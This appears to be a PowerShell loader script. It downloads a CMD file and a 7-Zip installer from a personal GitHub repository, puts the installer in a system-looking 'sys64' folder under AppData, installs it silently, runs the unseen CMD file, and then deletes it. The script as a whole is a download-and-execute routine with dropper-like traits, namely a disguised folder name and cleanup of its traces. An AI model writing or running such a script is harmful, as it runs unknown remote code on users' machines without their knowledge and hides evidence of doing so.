# Enable TLSv1.2 for compatibility
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Set the URLs for the CMD and 7zip files
$cmdUrl = "https://raw.githubusercontent.com/nizhenets/test/main/ION.cmd"
$sevenZipUrl = "https://github.com/nizhenets/test/raw/main/7z2406-x64.exe"

# Define the paths
$appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
$sys64Path = "$appDataPath\sys64"
$sevenZipExePath = "$sys64Path\7z2406-x64.exe"
$tempCmdPath = "$env:TEMP\ION.cmd"

# Create the sys64 directory
if (-not (Test-Path -Path $sys64Path)) {
    New-Item -ItemType Directory -Path $sys64Path
}

# Download the CMD file
Invoke-WebRequest -Uri $cmdUrl -OutFile $tempCmdPath

# Download the 7zip executable
Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipExePath

# Install 7zip silently
Start-Process -FilePath $sevenZipExePath -ArgumentList "/S" -NoNewWindow -Wait

# Execute the CMD file in a new CMD window
Start-Process "cmd.exe" -ArgumentList "/c `"$tempCmdPath`""

# Clean up the temporary file after a delay to ensure it runs completely
Start-Sleep -Seconds 10
Remove-Item -Path $tempCmdPath
